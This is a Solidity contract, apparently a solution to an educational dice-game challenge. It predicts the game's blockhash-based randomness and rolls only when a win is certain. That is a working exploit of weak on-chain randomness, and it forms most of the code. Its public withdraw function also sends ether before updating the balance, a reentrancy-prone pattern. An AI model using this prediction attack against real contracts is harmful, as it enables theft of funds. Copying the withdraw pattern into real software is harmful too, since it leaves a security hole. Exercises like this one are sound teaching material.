pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    mapping(address => uint256) public wonAmountPerUser;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _to, uint256 _amount) public {
        console.log("won amount: ", wonAmountPerUser[_to]);
        console.log("request amount: ", _amount);
        require(wonAmountPerUser[_to] >= _amount, "Balance is not enough!");

        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Failed to withdraw!");
        wonAmountPerUser[_to] -= _amount;
    }

    function getWonPrizeTotal() public view returns (uint256) {
        return wonAmountPerUser[owner()];
    }


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "The balance is not enough for predicting roll!");

        console.log("Starting roll prediction...");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())); // address will be the address of the DiceGame contract
        uint256 roll = uint256(hash) % 16;

        console.log("- block number:", block.number);
        console.log("- previous block hash:");
        console.logBytes32(prevHash);
        console.log("- contract address: ", address(this));
        console.log("- nonce: ", diceGame.nonce());
        console.log("- packed: ");
        console.logBytes(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        console.log("- hash: ");
        console.logBytes32(hash);
        console.log("- uint256 of hash: ", uint256(hash));

        console.log("Predicted roll: ", roll);

        if (roll > 2) {
            revert("Roll dice is greater than threshold!");
        }

        wonAmountPerUser[owner()] += diceGame.prize();
        console.log("User won: ", wonAmountPerUser[owner()]);
        diceGame.rollTheDice{value: 0.002 ether}();
    }


    //Add receive() function so contract can receive Eth
    receive() external payable {
        wonAmountPerUser[msg.sender] += msg.value;
    }
}
